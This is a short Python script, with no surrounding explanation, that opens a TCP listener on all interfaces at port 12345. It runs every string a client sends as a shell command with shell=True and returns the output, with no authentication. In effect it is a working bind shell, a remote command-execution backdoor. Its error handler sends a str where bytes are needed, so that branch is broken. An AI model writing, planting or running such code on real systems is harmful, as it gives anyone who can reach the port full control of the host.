import socket
import subprocess

# Define the server host and port
HOST = '0.0.0.0'
PORT = 12345

# Create a TCP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the specified host and port
server_socket.bind((HOST, PORT))

# Listen for incoming connections
server_socket.listen(5)


while True:
    client_socket, addr = server_socket.accept()

    while True:
        command = client_socket.recv(1024)
        if not command:
            break

        try:
            output = subprocess.check_output(command, shell=True)
            client_socket.sendall(output)
        except Exception as e:
            error_message = str(e)
            client_socket.sendall(error_message)

    client_socket.close()
